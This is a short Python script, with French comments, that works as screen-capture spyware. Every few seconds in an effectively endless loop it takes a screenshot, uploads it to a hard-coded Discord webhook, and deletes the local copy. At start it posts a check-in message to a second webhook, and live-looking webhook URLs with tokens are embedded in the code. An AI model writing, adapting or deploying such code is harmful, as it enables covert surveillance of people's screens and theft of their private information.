import pyautogui
import time
import logging
import requests
from discord import SyncWebhook, File # Import SyncWebhook
import os


#_____________________________________________l'envoie du screen_______________________________________________________________________________________

webhook = "https://discord.com/api/webhooks/1132444091825782794/HxaGf28ZLI_c2vJ43p60E420rw2fO0YF0wUpJr853WDPAUJhJ5eAnFEO-Y7nXq1PWVAo"
data = requests.post(webhook, json={'content': 'nv ct'})
#-----------------------------------------------------------------------------------------------------------------
#webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/1132444091825782794/HxaGf28ZLI_c2vJ43p60E420rw2fO0YF0wUpJr853WDPAUJhJ5eAnFEO-Y7nXq1PWVAo') # Initializing webhook
#webhook.send(file="db\debug.txt") # Executing webhook.

#___________________________________________message_d'erreur________________________________________________________________

#________________________________________________message_de_debug__________________________________________________________________


logging.basicConfig(level=logging.DEBUG,
                    filename="debug.txt",
                    filemode="a",
                    format='%(asctime)s - %(levelname)s - %(message)s')

logging.debug("message debug")
#______________________________________mail______________________________





#___________________________________________le_screen______________________________________________________________________________________
i = 0
while i < 1000000:  
    screen = pyautogui.screenshot()
    screen.save('image14589632.png')
    time.sleep(1)
    logging.debug("message de test")
    logging.debug("----------------------------------------------------------")
    webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/1136048543325503498/UF62cyGx8qH97vhI1usZ2DTkNLcXRVa2HMAsXkbx1ocad2YCrC1X7yIK6hOMUpC7cJTC') # Initializing webhook
    webhook.send(file=File("image14589632.png") )
    os.remove("image14589632.png")
    time.sleep(3)
i = i + 1
#__________________________________________________________________________________________________________
# coding: utf-8
#fichier = open("data.txt", "r")
#print fichier.read()
#fichier.close()